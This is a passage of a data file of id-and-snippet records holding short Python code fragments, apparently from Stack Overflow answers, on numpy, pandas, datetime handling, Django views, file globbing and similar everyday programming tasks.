ValueError: invalid literal for int() with base 10: '\xd9\xa1\xd9\xa2\xd9\xa3\xd9\xa4\xd9\xa5\xd9\xa6\xd9\xa7\xd9\xa8\xd9\xa9\xd9\xa0'
</snippet></ROW><ROW><id>11883097</id><snippet>bytearray</snippet></ROW><ROW><id>11883097</id><snippet>string</snippet></ROW><ROW><id>11883097</id><snippet>string</snippet></ROW><ROW><id>11883097</id><snippet>array</snippet></ROW><ROW><id>11883097</id><snippet>bytearray</snippet></ROW><ROW><id>11883097</id><snippet>bytearray</snippet></ROW><ROW><id>11883097</id><snippet>array.array</snippet></ROW><ROW><id>11883097</id><snippet>bytearray</snippet></ROW><ROW><id>11883097</id><snippet>array('B')</snippet></ROW><ROW><id>11883097</id><snippet>bytearray</snippet></ROW><ROW><id>11883133</id><snippet>np.where</snippet></ROW><ROW><id>11883133</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a = np.array([[1,2,3,4,5,6,7,8,1,2,3,4,5,6,7,8]])
&gt;&gt;&gt; np.where(a==2, 1, 0)
array([[0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0]])
</snippet></ROW><ROW><id>11883191</id><snippet>ctypes</snippet></ROW><ROW><id>11883191</id><snippet>LoadLibrary</snippet></ROW><ROW><id>11883280</id><snippet>.update</snippet></ROW><ROW><id>11883280</id><snippet>&gt;&gt;&gt; import collections
&gt;&gt;&gt; counter = collections.Counter()
&gt;&gt;&gt; counter.update((('user1', 'loggedin'),))
&gt;&gt;&gt; counter.update((('user2', 'compiled'),))
&gt;&gt;&gt; counter.update((('user1', 'compiled'),))
&gt;&gt;&gt; counter.update((('user1', 'compiled'),))
&gt;&gt;&gt; counter
Counter({('user1', 'compiled'): 2, ('user1', 'loggedin'): 1, ('user2', 'compiled'): 1})
</snippet></ROW><ROW><id>11883295</id><snippet>for tg in data_var:
     for col in range(content.no_of_cols):
        var = "field" + str(col)
        value = getattr(tg, var)
</snippet></ROW><ROW><id>11883385</id><snippet>FUNCTION_LIST = [(f1,(2)), #each list entry is a tuple containing a function object and a tuple of arguments
                 (f1,(6)),
                 (f2,())]
</snippet></ROW><ROW><id>11883385</id><snippet>(2)</snippet></ROW><ROW><id>11883385</id><snippet>(6)</snippet></ROW><ROW><id>11883385</id><snippet>(2,)</snippet></ROW><ROW><id>11883385</id><snippet>(6,)</snippet></ROW><ROW><id>11883385</id><snippet>for f, args in FUNCTION_LIST:
    f(*args)
</snippet></ROW><ROW><id>11883385</id><snippet>*args</snippet></ROW><ROW><id>11883498</id><snippet>adj = temp.weekday()-week_day
</snippet></ROW><ROW><id>11883498</id><snippet>% 7</snippet></ROW><ROW><id>11883498</id><snippet>adj = (week_day - temp.weekday()) % 7
</snippet></ROW><ROW><id>11883498</id><snippet>nth_week-1</snippet></ROW><ROW><id>11883498</id><snippet>def nth_weekday(the_date, nth_week, week_day):
    temp = the_date.replace(day=1)
    adj = (week_day - temp.weekday()) % 7
    temp += timedelta(days=adj)
    temp += timedelta(weeks=nth_week-1)
    return temp

&gt;&gt;&gt; nth_weekday(datetime(2011,8,9), 3, 4)
datetime.datetime(2011, 8, 19, 0, 0)
</snippet></ROW><ROW><id>11883769</id><snippet>os.path.realpath('config.cfg')</snippet></ROW><ROW><id>11883827</id><snippet>csv</snippet></ROW><ROW><id>11883827</id><snippet>csv.__file__</snippet></ROW><ROW><id>11883856</id><snippet>from datetime import datetime
import pytz # pip install pytz

fmt = '%Y-%m-%d %H:%M:%S %Z%z'
tz = pytz.timezone("America/New_York") # supply client's timezone here

# Get correct date for the midnight using given timezone.

# due to we are interested only in midnight we can:

# 1. ignore ambiguity when local time repeats itself during DST change e.g.,
# 2012-04-01 02:30:00 EST+1100 and
# 2012-04-01 02:30:00 EST+1000
# otherwise we should have started with UTC time

# 2. rely on .now(tz) to choose timezone correctly (dst/no dst)
now = datetime.now(tz)
print(now.strftime(fmt))

# Get midnight in the correct timezone (taking into account DST)
midnight = tz.localize(now.replace(hour=0, minute=0, second=0, microsecond=0, tzinfo=None),
                       is_dst=None)
print(midnight.strftime(fmt))

# Convert to UTC (no need to call `tz.normalize()` due to UTC has no DST transitions)
dt = midnight.astimezone(pytz.utc)
print(dt.strftime(fmt))

# Get POSIX timestamp
print((dt - datetime(1970,1,1, tzinfo=pytz.utc)).total_seconds())
</snippet></ROW><ROW><id>11883856</id><snippet>2012-08-09 08:46:29 EDT-0400
2012-08-09 00:00:00 EDT-0400
2012-08-09 04:00:00 UTC+0000
1344484800.0
</snippet></ROW><ROW><id>11883856</id><snippet>1344470400.0</snippet></ROW><ROW><id>11884203</id><snippet>mod_scanProfiles.main</snippet></ROW><ROW><id>11884203</id><snippet>subprocess.Popen</snippet></ROW><ROW><id>11884203</id><snippet># in mod_scanPfiles.main:
p = subprocess.Popen(...)
p.wait() # wait until the process completes.
</snippet></ROW><ROW><id>11884203</id><snippet>Thread.join</snippet></ROW><ROW><id>11884203</id><snippet># assuming you have a list of thread objects somewhere
threads = [MyThread(), ...]
for thread in threads:
    thread.start()
for thread in threads:
    thread.join()
</snippet></ROW><ROW><id>11884299</id><snippet>unicode</snippet></ROW><ROW><id>11884299</id><snippet>str</snippet></ROW><ROW><id>11884299</id><snippet>self.writer.writerow([unicode(s).encode("utf-8") for s in row])
</snippet></ROW><ROW><id>11884350</id><snippet>decode</snippet></ROW><ROW><id>11884350</id><snippet>myinstance.myfield.encode('utf-8')</snippet></ROW><ROW><id>11884448</id><snippet>{% for party in parties %}
</snippet></ROW><ROW><id>11884448</id><snippet>{% for party in parties %}
    &lt;li&gt;{{ party.person.profession}}&lt;/li&gt;
    ...
{% endfor %}
</snippet></ROW><ROW><id>11884448</id><snippet>{% set person = party.person %}
</snippet></ROW><ROW><id>11884607</id><snippet>linspace</snippet></ROW><ROW><id>11884607</id><snippet>x</snippet></ROW><ROW><id>11884607</id><snippet>x.min()</snippet></ROW><ROW><id>11884607</id><snippet>x.max()</snippet></ROW><ROW><id>11884607</id><snippet># Interpolate the data using a cubic spline to "new_length" samples
new_length = 50
interpolated_x = np.linspace(x.min(), x.max(), new_length - len(x) + 2)
new_x = np.sort(np.append(interpolated_x, x[1:-1]))  # include the original points
new_y = sp.interpolate.interp1d(x, y, kind='cubic')(new_x)
</snippet></ROW><ROW><id>11884607</id><snippet>np.linspace</snippet></ROW><ROW><id>11884607</id><snippet>np.append</snippet></ROW><ROW><id>11884607</id><snippet>x</snippet></ROW><ROW><id>11884607</id><snippet>np.sort</snippet></ROW><ROW><id>11884834</id><snippet>if imagename[0].lower().endswith((".jpg", ".jpeg", ".png")):
    # whatever
</snippet></ROW><ROW><id>11884834</id><snippet>str.endswith()</snippet></ROW><ROW><id>11884880</id><snippet>matplotlib.scatter</snippet></ROW><ROW><id>11884880</id><snippet>carr</snippet></ROW><ROW><id>11884880</id><snippet>import numpy as np
import pylab as plt

# This fails since carr[0,0] is of type numpy.int64
carr = np.array([[0,0,0,1],[0,0,1,1],[0,1,0,1]]) # RGBA color array
carr[1] = np.repeat(np.nan,4)

pts = np.array([[1,2],[1,3],[2,2]]).T
plt.scatter(pts[0],pts[1],c=carr,s=500)
</snippet></ROW><ROW><id>11884880</id><snippet>carr</snippet></ROW><ROW><id>11884880</id><snippet>numpy.float</snippet></ROW><ROW><id>11884880</id><snippet>nan</snippet></ROW><ROW><id>11884880</id><snippet># This works but still puts a black dot for the nan point
carr = np.array([[0.0,0,0,1],[0,0,1,1],[0,1,0,1]]) # RGBA color array
carr[1] = np.repeat(np.nan,4)

pts = np.array([[1,2],[1,3],[2,2]]).T
plt.scatter(pts[0],pts[1],c=carr,s=500)
</snippet></ROW><ROW><id>11884880</id><snippet>carr = np.array([[0.0,0,0,1],[0,0,1,1],[0,1,0,1]]) # RGBA color array
carr[1] = np.repeat(np.nan,4)
pts = np.array([[1,2],[1,3],[2,2]]).T

idx = ~np.isnan(carr[:,0])
plt.scatter(pts[0][idx],pts[1][idx],c=carr[idx],s=500)
</snippet></ROW><ROW><id>11885320</id><snippet>onclick</snippet></ROW><ROW><id>11885320</id><snippet>placeId</snippet></ROW><ROW><id>11885320</id><snippet>/places/duplicates.jsp?inPID=</snippet></ROW><ROW><id>11885567</id><snippet>if</snippet></ROW><ROW><id>11885567</id><snippet>__nonzero__()</snippet></ROW><ROW><id>11885567</id><snippet>bool()</snippet></ROW><ROW><id>11885567</id><snippet>__nonzero__()</snippet></ROW><ROW><id>11885567</id><snippet>object.__nonzero__(self)</snippet></ROW><ROW><id>11885567</id><snippet>bool();</snippet></ROW><ROW><id>11885567</id><snippet>__len__()</snippet></ROW><ROW><id>11885567</id><snippet>__len__()</snippet></ROW><ROW><id>11885567</id><snippet>__nonzero__()</snippet></ROW><ROW><id>11885581</id><snippet>transpose()</snippet></ROW><ROW><id>11885581</id><snippet>array([1, 2, 3])
</snippet></ROW><ROW><id>11885581</id><snippet>array([1,
       2,
       3])
</snippet></ROW><ROW><id>11885581</id><snippet>transpose()</snippet></ROW><ROW><id>11885581</id><snippet>matrix</snippet></ROW><ROW><id>11885581</id><snippet>In [1]: numpy.matrix([1, 2, 3])
Out[1]: matrix([[1, 2, 3]])

In [2]: numpy.matrix([1, 2, 3]).T
Out[2]: 
matrix([[1],
        [2],
        [3]])
</snippet></ROW><ROW><id>11885581</id><snippet>numpy.matrix</snippet></ROW><ROW><id>11885637</id><snippet>.split()</snippet></ROW><ROW><id>11885637</id><snippet>waternumber</snippet></ROW><ROW><id>11885637</id><snippet>in</snippet></ROW><ROW><id>11885637</id><snippet>for line in otherinput:
    line = line.split()
    waternumber = int(line[1])
    if waternumber in twodee:
        line[9] = twodee[waternumber]
    print line
</snippet></ROW><ROW><id>11885637</id><snippet>.split()</snippet></ROW><ROW><id>11885637</id><snippet>            line.split()[1] == waternumber
            line.split()[9] = residencetime
</snippet></ROW><ROW><id>11885637</id><snippet>waternumber</snippet></ROW><ROW><id>11885637</id><snippet>True</snippet></ROW><ROW><id>11885637</id><snippet>False</snippet></ROW><ROW><id>11885637</id><snippet>residencetime</snippet></ROW><ROW><id>11885637</id><snippet>line.split()</snippet></ROW><ROW><id>11885637</id><snippet>list</snippet></ROW><ROW><id>11885640</id><snippet>f(x) == x*t + c</snippet></ROW><ROW><id>11885640</id><snippet>f</snippet></ROW><ROW><id>11885640</id><snippet>x</snippet></ROW><ROW><id>11885640</id><snippet>f</snippet></ROW><ROW><id>11885640</id><snippet>x</snippet></ROW><ROW><id>11885640</id><snippet>x*t + c</snippet></ROW><ROW><id>11885640</id><snippet>unknown</snippet></ROW><ROW><id>11885640</id><snippet>f</snippet></ROW><ROW><id>11885640</id><snippet>c</snippet></ROW><ROW><id>11885640</id><snippet>t</snippet></ROW><ROW><id>11885640</id><snippet>Real</snippet></ROW><ROW><id>11885640</id><snippet>Int</snippet></ROW><ROW><id>11885640</id><snippet>from z3 import *

c=Int('c')
t=Int('t')

def f(x):
    return x*t + c

# data is a list of pairs (x, r)
def find(data):
    s=Solver()
    s.add([ f(x) == r for (x, r) in data ])
    t = s.check()
    if s.check() == sat:
        print s.model()
    else:
        print t

find([(1, 55)])
find([(1, 55), (12, 34)])
find([(1, 55), (12, 34), (13, 300)])
</snippet></ROW><ROW><id>11885640</id><snippet>define-fun</snippet></ROW><ROW><id>11885887</id><snippet>def get_basic():
    L = []
    while True:
        line = str( input() )
        L.append( line )
        if "END" in line:
            break
    return L
</snippet></ROW><ROW><id>11885986</id><snippet>del</snippet></ROW><ROW><id>11885986</id><snippet>del my_module.waiting_user</snippet></ROW><ROW><id>11886361</id><snippet>unschedule_all</snippet></ROW><ROW><id>11886361</id><snippet>stop</snippet></ROW><ROW><id>11886476</id><snippet>bson</snippet></ROW><ROW><id>11886476</id><snippet>import json, re
from bson import json_util

with open("data.tengenjson", "rb") as f:
    # read the entire input; in a real application,
    # you would want to read a chunk at a time
    bsondata = f.read()

    # convert the TenGen JSON to Strict JSON
    # here, I just convert the ObjectId and Date structures,
    # but it's easy to extend to cover all structures listed at
    # http://www.mongodb.org/display/DOCS/Mongo+Extended+JSON
    jsondata = re.sub(r'ObjectId\s*\(\s*\"(\S+)\"\s*\)',
                      r'{"$oid": "\1"}',
                      bsondata)
    jsondata = re.sub(r'Date\s*\(\s*(\S+)\s*\)',
                      r'{"$date": \1}',
                      jsondata)

    # now we can parse this as JSON, and use MongoDB's object_hook
    # function to get rich Python data structures inside a dictionary
    data = json.loads(jsondata, object_hook=json_util.object_hook)

    # just print the output for demonstration, along with the type
    print(data)
    print(type(data))

    # serialise to JSON and print
    print(json_util.dumps(data))
</snippet></ROW><ROW><id>11886484</id><snippet>pip</snippet></ROW><ROW><id>11886564</id><snippet>def is_outlier(points, thresh=3.5):
    """
    Returns a boolean array with True if points are outliers and False 
    otherwise.

    Parameters:
    -----------
        points : An numobservations by numdimensions array of observations
        thresh : The modified z-score to use as a threshold. Observations with
            a modified z-score (based on the median absolute deviation) greater
            than this value will be classified as outliers.

    Returns:
    --------
        mask : A numobservations-length boolean array.

    References:
    ----------
        Boris Iglewicz and David Hoaglin (1993), "Volume 16: How to Detect and
        Handle Outliers", The ASQC Basic References in Quality Control:
        Statistical Techniques, Edward F. Mykytka, Ph.D., Editor. 
    """
    if len(points.shape) == 1:
        points = points[:,None]
    median = np.median(points, axis=0)
    diff = np.sum((points - median)**2, axis=-1)
    diff = np.sqrt(diff)
    med_abs_deviation = np.median(diff)

    modified_z_score = 0.6745 * diff / med_abs_deviation

    return modified_z_score &gt; thresh
</snippet></ROW><ROW><id>11886564</id><snippet>import numpy as np
import matplotlib.pyplot as plt

# The function above... In my case it's in a local utilities module
from sci_utilities import is_outlier

# Generate some data
x = np.random.random(100)

# Append a few "bad" points
x = np.r_[x, -3, -10, 100]

# Keep only the "good" points
# "~" operates as a logical not operator on boolean numpy arrays
filtered = x[~is_outlier(x)]

# Plot the results
fig, (ax1, ax2) = plt.subplots(nrows=2)

ax1.hist(x)
ax1.set_title('Original')

ax2.hist(filtered)
ax2.set_title('Without Outliers')

plt.show()
</snippet></ROW><ROW><id>11886843</id><snippet>post_syncdb</snippet></ROW><ROW><id>11886843</id><snippet>auth</snippet></ROW><ROW><id>11886843</id><snippet>post_syncdb</snippet></ROW><ROW><id>11886843</id><snippet>contenttypes</snippet></ROW><ROW><id>11886843</id><snippet>ContentType</snippet></ROW><ROW><id>11886843</id><snippet>INSTALLED_APPS</snippet></ROW><ROW><id>11886843</id><snippet>auth</snippet></ROW><ROW><id>11886843</id><snippet>A</snippet></ROW><ROW><id>11886843</id><snippet>contenttypes</snippet></ROW><ROW><id>11886843</id><snippet>contenttypes</snippet></ROW><ROW><id>11886843</id><snippet>INSTALLED_APPS</snippet></ROW><ROW><id>11886843</id><snippet>contenttypes</snippet></ROW><ROW><id>11886843</id><snippet>contenttypes</snippet></ROW><ROW><id>11886843</id><snippet>INSTALLED_APPS</snippet></ROW><ROW><id>11886843</id><snippet>sender</snippet></ROW><ROW><id>11886843</id><snippet>contenttypes</snippet></ROW><ROW><id>11886846</id><snippet>sys.path</snippet></ROW><ROW><id>11886846</id><snippet>.eggs</snippet></ROW><ROW><id>11886846</id><snippet>$HOME/.buildout/</snippet></ROW><ROW><id>11886846</id><snippet>conf.py</snippet></ROW><ROW><id>11886846</id><snippet>$HOME/.buildout/</snippet></ROW><ROW><id>11886846</id><snippet>.eggs</snippet></ROW><ROW><id>11886846</id><snippet>$HOME/.buildout/</snippet></ROW><ROW><id>11886846</id><snippet>.eggs</snippet></ROW><ROW><id>11886846</id><snippet>.buildout</snippet></ROW><ROW><id>11886846</id><snippet>make html</snippet></ROW><ROW><id>11886846</id><snippet>MyClass</snippet></ROW><ROW><id>11886863</id><snippet>s='DIV ID=0X78800009 EXT="LOS ANGELES" TY=STANDARD OWN=0X74400002 ABBR=LA'

s.split('"')[1]
'LOS ANGELES'
</snippet></ROW><ROW><id>11887165</id><snippet>text size</snippet></ROW><ROW><id>11887165</id><snippet>global</snippet></ROW><ROW><id>11887165</id><snippet>freetds.conf</snippet></ROW><ROW><id>11887165</id><snippet>[global]
    tds version = 8.0
    text size = 4294967295
</snippet></ROW><ROW><id>11887165</id><snippet>TEXTSIZE</snippet></ROW><ROW><id>11887165</id><snippet>sql = """
    SET TEXTSIZE 2147483647;
    SELECT  Req.ID,
            ShReq.Summary AS [Short Name],
            ShReq.ALM_SharedText AS [Text],
            Req.ContainedBy,
            Req.DocumentID
    FROM    CurMKS..ALM_Requirement Req
            JOIN CurMKS..ALM_SharedRequirement ShReq ON Req.[References] = ShReq.ID
    WHERE DocumentID = 111111;
      """
</snippet></ROW><ROW><id>11887604</id><snippet>import numpy as np
dt = np.dtype({"names": ["First", "_"], 
               "formats": [np.uint32, (np.void,1)], 
               "offsets": [3,7],
})
arr = np.empty( (5,), dtype=dt )
</snippet></ROW><ROW><id>11887769</id><snippet>for %G in (FY*.txt); do python my_script.py %G
</snippet></ROW><ROW><id>11887769</id><snippet>with open(sys.argv[1], 'r') as f:
    do_something_with(f)
</snippet></ROW><ROW><id>11887769</id><snippet>fileinput</snippet></ROW><ROW><id>11887769</id><snippet>for line in fileinput.input():
    do_something_with(line)
</snippet></ROW><ROW><id>11887769</id><snippet>glob</snippet></ROW><ROW><id>11887769</id><snippet>python my_script.py FY*.txt
</snippet></ROW><ROW><id>11887769</id><snippet>for file in glob.glob(sys.argv[1]):
     with open(file, 'r') as f:
         do_something_to(f)
</snippet></ROW><ROW><id>11887769</id><snippet>for files in([glob.glob(arg) for arg in sys.argv[1:]]):
    for file in files:
        with open(file, 'r') as f:
            do_something_to(f)
</snippet></ROW><ROW><id>11887769</id><snippet>python my_script FY*.txt WS*.txt
</snippet></ROW><ROW><id>11887885</id><snippet>distutils.version</snippet></ROW><ROW><id>11887885</id><snippet>&gt;&gt;&gt; from distutils.version import LooseVersion, StrictVersion
&gt;&gt;&gt; LooseVersion("2.3.1") &lt; LooseVersion("10.1.2")
True
&gt;&gt;&gt; StrictVersion("2.3.1") &lt; StrictVersion("10.1.2")
True
&gt;&gt;&gt; StrictVersion("1.3.a4")
Traceback (most recent call last):
...
ValueError: invalid version number '1.3.a4'
</snippet></ROW><ROW><id>11887885</id><snippet>LooseVersion</snippet></ROW><ROW><id>11887885</id><snippet>StrictVersion</snippet></ROW><ROW><id>11887885</id><snippet>NormalizedVersion</snippet></ROW><ROW><id>11887894</id><snippet>ignoreLines = True</snippet></ROW><ROW><id>11887894</id><snippet>line = next(inf, '') # a file is an iterator over lines
ignoreLines = all((s == '0') for s in line.split()) # ignore if all zeros
</snippet></ROW><ROW><id>11888068</id><snippet>from dateutil.rrule import *    

def add_weekday_seconds(start, x):
    rr = rrule(SECONDLY, byweekday=(MO, TU, WE, TH, FR), dtstart=start, interval=x)
    return rr.after(start)
</snippet></ROW><ROW><id>11888068</id><snippet>rrule</snippet></ROW><ROW><id>11888068</id><snippet>start</snippet></ROW><ROW><id>11888068</id><snippet>datetime</snippet></ROW><ROW><id>11888068</id><snippet>x</snippet></ROW><ROW><id>11888068</id><snippet>after</snippet></ROW><ROW><id>11888068</id><snippet>In [131]: friday_night = datetime.datetime(2012, 8, 10, 23, 59, 50)

In [132]: add_weekday_seconds(friday_night, 5)
Out[132]: datetime.datetime(2012, 8, 10, 23, 59, 55)

In [133]: add_weekday_seconds(friday_night, 10)
Out[133]: datetime.datetime(2012, 8, 13, 0, 0)

In [134]: add_weekday_seconds(friday_night, 15)
Out[134]: datetime.datetime(2012, 8, 13, 0, 0, 5)
</snippet></ROW><ROW><id>11888219</id><snippet>int</snippet></ROW><ROW><id>11888219</id><snippet>int</snippet></ROW><ROW><id>11888219</id><snippet>contract_id</snippet></ROW><ROW><id>11888219</id><snippet>int</snippet></ROW><ROW><id>11888219</id><snippet>...
else:
  contract = Contract.get_by_id(int(contract_id))
</snippet></ROW><ROW><id>11888219</id><snippet>contract_id</snippet></ROW><ROW><id>11888219</id><snippet>self.request.get</snippet></ROW><ROW><id>11888219</id><snippet>contract_id = self.request.get("contract_id")
if not contract_id:
</snippet></ROW><ROW><id>11888219</id><snippet>contract_id = self.request.get("contract_id", None)
if contract_id is None:
</snippet></ROW><ROW><id>11888421</id><snippet>QTextEdit.moveCursor</snippet></ROW><ROW><id>11888421</id><snippet>QTextEdit.ensureCursorVisible</snippet></ROW><ROW><id>11888421</id><snippet>textedit.moveCursor(QtGui.QTextCursor.End)
textedit.ensureCursorVisible()
</snippet></ROW><ROW><id>11888549</id><snippet>import os</snippet></ROW><ROW><id>11888549</id><snippet>with open(filename, 'wb') as out:</snippet></ROW><ROW><id>11888549</id><snippet>with open(filepath, 'wb') as out:</snippet></ROW><ROW><id>11888598</id><snippet>weakref.WeakSet</snippet></ROW><ROW><id>11888598</id><snippet>import weakref

class InstanceTracker(object):
    def __init__(self):
        self.instances = {}
    def new(self, cls, *args, **kwargs):
        instance = cls(*args, **kwargs)
        self.instances.setdefault(cls, weakref.WeakSet()).add(instance)
        return instance
    def iter_instances(cls):
        return iter(self.instances[cls])
</snippet></ROW><ROW><id>11888598</id><snippet>SomeClass</snippet></ROW><ROW><id>11888598</id><snippet>tracker.new(SomeClass)</snippet></ROW><ROW><id>11888598</id><snippet>InstanceTracker</snippet></ROW><ROW><id>11888598</id><snippet>tracker</snippet></ROW><ROW><id>11888784</id><snippet>In [156]: df
Out[156]: 
   CHROM   POS     GENE  DESC  JOE  FRED  BILLY  SUSAN  TONY
0     10  1442    LOXL4   bad    1     0      0      1     0
1     10   335    LOXL4   bad    1     0      0      0     0
2     10  3438    LOXL4  good    0     0      1      0     0
3     10  4819  PYROXD2   bad    0     1      0      0     0
4     10  4829  PYROXD2   bad    0     1      0      1     0
5     10  9851     HPS1  good    1     0      0      0     0

In [157]: grouped = df.groupby(['GENE', 'DESC'])

In [158]: grouped.agg(np.sum) # agg is a shortcut for aggregate
Out[158]: 
              CHROM   POS  JOE  FRED  BILLY  SUSAN  TONY
GENE    DESC                                            
HPS1    good     10  9851    1     0      0      0     0
LOXL4   bad      20  1777    2     0      0      1     0
        good     10  3438    0     0      1      0     0
PYROXD2 bad      20  9648    0     2      0      1     0
</snippet></ROW><ROW><id>11888784</id><snippet>sum</snippet></ROW><ROW><id>11888784</id><snippet>mean</snippet></ROW><ROW><id>11888784</id><snippet>ufuncs</snippet></ROW><ROW><id>11888784</id><snippet>In [159]: grouped.sum()
Out[159]: 
              CHROM   POS  JOE  FRED  BILLY  SUSAN  TONY
GENE    DESC                                            
HPS1    good     10  9851    1     0      0      0     0
LOXL4   bad      20  1777    2     0      0      1     0
        good     10  3438    0     0      1      0     0
PYROXD2 bad      20  9648    0     2      0      1     0
</snippet></ROW><ROW><id>11888784</id><snippet>dict</snippet></ROW><ROW><id>11888784</id><snippet>aggregate</snippet></ROW><ROW><id>11888784</id><snippet>def custom_agg(s, default=np.sum, other={}):
    if s.name in other.keys():
        return other[s.name](s)
    else:
        return default(s)
</snippet></ROW><ROW><id>11888784</id><snippet>agg</snippet></ROW><ROW><id>11888784</id><snippet>In [59]: grouped.agg(custom_agg, default=np.sum, other={'CHROM': np.mean})
Out[59]: 
              CHROM   POS  JOE  FRED  BILLY  SUSAN  TONY
GENE    DESC                                            
HPS1    good     10  9851    1     0      0      0     0
LOXL4   bad      10  1777    2     0      0      1     0
        good     10  3438    0     0      1      0     0
PYROXD2 bad      10  9648    0     2      0      1     0
</snippet></ROW><ROW><id>11888857</id><snippet>DispatchEx()</snippet></ROW><ROW><id>11888887</id><snippet>numpy.ravel_multi_index</snippet></ROW><ROW><id>11888887</id><snippet>numpy.unique</snippet></ROW><ROW><id>11888887</id><snippet>d</snippet></ROW><ROW><id>11888887</id><snippet>numpy.lexsort</snippet></ROW><ROW><id>11888887</id><snippet>img2.flat[uniq_1d_bin_value] = bin_max</snippet></ROW><ROW><id>11889154</id><snippet>any()</snippet></ROW><ROW><id>11889154</id><snippet>any_item_is_whatever = any(item.is_whatever() for item in items)
</snippet></ROW><ROW><id>11889219</id><snippet>file.read</snippet></ROW><ROW><id>11889219</id><snippet>NULL</snippet></ROW><ROW><id>11889219</id><snippet>END OF TEXT</snippet></ROW><ROW><id>11889360</id><snippet>somedir</snippet></ROW><ROW><id>11889360</id><snippet>isinstance(somedir, unicode)</snippet></ROW><ROW><id>11889360</id><snippet>unicode_somedir = somedir.decode(encoding)
</snippet></ROW><ROW><id>11889431</id><snippet>a = Coordinate(1,2,3)
b = Coordinate(-5,-6,-7)
...
</snippet></ROW><ROW><id>11889488</id><snippet>from numpy import nan</snippet></ROW><ROW><id>11889488</id><snippet>NaN</snippet></ROW><ROW><id>11889707</id><snippet>&gt;&gt;&gt; s = '/foo/bar/zoo/file.ext'
&gt;&gt;&gt; import ntpath
&gt;&gt;&gt; import os
&gt;&gt;&gt; s.replace(os.sep,ntpath.sep)
'\\foo\\bar\\zoo\\file.ext'
</snippet></ROW><ROW><id>11889793</id><snippet>if(len(set(l)) !=7):
    return lotto()
</snippet></ROW><ROW><id>11889796</id><snippet>append</snippet></ROW><ROW><id>11889796</id><snippet>extend</snippet></ROW><ROW><id>11889796</id><snippet>extend</snippet></ROW><ROW><id>11889796</id><snippet>append</snippet></ROW><ROW><id>11889796</id><snippet>&gt;&gt;&gt; l = [1,2,3]
&gt;&gt;&gt; l.append(4)
&gt;&gt;&gt; l
[1, 2, 3, 4] 

&gt;&gt;&gt; l = [1,2,3]
&gt;&gt;&gt; l.extend([4,5,6])
&gt;&gt;&gt; l
[1, 2, 3, 4, 5, 6]
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11889862</id><snippet>differences = [float(row[3]) - float(row[4]) for row in table]
</snippet></ROW><ROW><id>11889862</id><snippet>differences[i] == table[i][3] - table[i][4]</snippet></ROW><ROW><id>11889862</id><snippet>table = [[r[0], float(r[1]), float(r[2]),
         float(r[3]), float(r[4]), r[5], float(r[6])] for r in table]
</snippet></ROW><ROW><id>11889862</id><snippet>differences = [r[3] - r[4] for r in table]
</snippet></ROW><ROW><id>11889964</id><snippet>&gt;&gt;&gt; from urllib2 import *
&gt;&gt;&gt; password_mgr = HTTPPasswordMgrWithDefaultRealm()
&gt;&gt;&gt; url = "https://stream.twitter.com/1/statuses/sample.json"
&gt;&gt;&gt; password_mgr.add_password(None, url, 'USERNAME', 'PASSWORD')
             #worked with my real twitter credentials ^ 
&gt;&gt;&gt; h = HTTPBasicAuthHandler(password_mgr)
&gt;&gt;&gt; opener = build_opener(h)
&gt;&gt;&gt; page = opener.open(url)
&gt;&gt;&gt; page.getcode()
200
</snippet></ROW><ROW><id>11890010</id><snippet>get_queryset</snippet></ROW><ROW><id>11890010</id><snippet>def get_queryset(self):
    if self.request.POST.has_key('competition'):
        return ScoredEvent.objects.all()
    else:
        return super(MyView, self).get_queryset()
</snippet></ROW><ROW><id>11890010</id><snippet>ScoredEvent</snippet></ROW><ROW><id>11890010</id><snippet>get_object</snippet></ROW><ROW><id>11890010</id><snippet>def get_object(self, queryset=None):
    obj = super(MyView, self).get_object(queryset=queryset)
    try:
        return ScoredEvent.objects.get(pk=obj.pk)
    except ScoredEvent.DoesNotExist:
        return obj
</snippet></ROW><ROW><id>11890010</id><snippet>ScoredEvent</snippet></ROW><ROW><id>11890010</id><snippet>Event</snippet></ROW><ROW><id>11890010</id><snippet>get_form_class</snippet></ROW><ROW><id>11890010</id><snippet>ScoredEvent</snippet></ROW><ROW><id>11890010</id><snippet>ScoredEvent</snippet></ROW><ROW><id>11890010</id><snippet>ScoredEvent</snippet></ROW><ROW><id>11890010</id><snippet>from django.forms import models as model_forms

def get_form_class(self):
    if isinstance(self.object, ScoredEvent):
        return model_forms.modelform_factory(ScoredEvent, ScoredEventForm)
    else:
        return super(MyView, self).get_form_class()
</snippet></ROW><ROW><id>11890414</id><snippet>'function' object has no attribute 'int_id'</snippet></ROW><ROW><id>11890414</id><snippet>if (card1 &gt; card2):</snippet></ROW><ROW><id>11890414</id><snippet>card1 = getMyOtherCard</snippet></ROW><ROW><id>11890414</id><snippet>card1 = getMyOtherCard()</snippet></ROW><ROW><id>11890526</id><snippet>dict()</snippet></ROW><ROW><id>11890526</id><snippet>{'b': 2}</snippet></ROW><ROW><id>11890526</id><snippet>cm</snippet></ROW><ROW><id>11890526</id><snippet>&gt;&gt;&gt; cm = ChainableMap({'a': 1})
&gt;&gt;&gt; cm['b'] = 2
&gt;&gt;&gt; dict(cm)
{'b': 2}
</snippet></ROW><ROW><id>11890526</id><snippet>__setitem__</snippet></ROW><ROW><id>11890526</id><snippet>collections.MutableMapping</snippet></ROW><ROW><id>11890526</id><snippet>dict</snippet></ROW><ROW><id>11890526</id><snippet>self.update(parent)</snippet></ROW><ROW><id>11890526</id><snippet>ChainableMap.__init__()</snippet></ROW><ROW><id>11890526</id><snippet>dict(cm)</snippet></ROW><ROW><id>11890526</id><snippet>{'b': 2}</snippet></ROW><ROW><id>11890526</id><snippet>dict(cm)</snippet></ROW><ROW><id>11890526</id><snippet>PyDict_Merge</snippet></ROW><ROW><id>11890526</id><snippet>cm</snippet></ROW><ROW><id>11890526</id><snippet>b</snippet></ROW><ROW><id>11890526</id><snippet>if (PyDict_Check(b)) {
    other = (PyDictObject*)b;
    ...
</snippet></ROW><ROW><id>11890526</id><snippet>other</snippet></ROW><ROW><id>11890526</id><snippet>parent</snippet></ROW><ROW><id>11890526</id><snippet>dict()</snippet></ROW><ROW><id>11890593</id><snippet>py.test</snippet></ROW><ROW><id>11890593</id><snippet>py.test</snippet></ROW><ROW><id>11890801</id><snippet>with open("myFile.txt","r") as readfile, open("outFile.txt","w") as outfile:
    for line in readfile:
        if line.count("(") != line.count(")") or line.count('"') % 2 != 0:
            outfile.write(line)
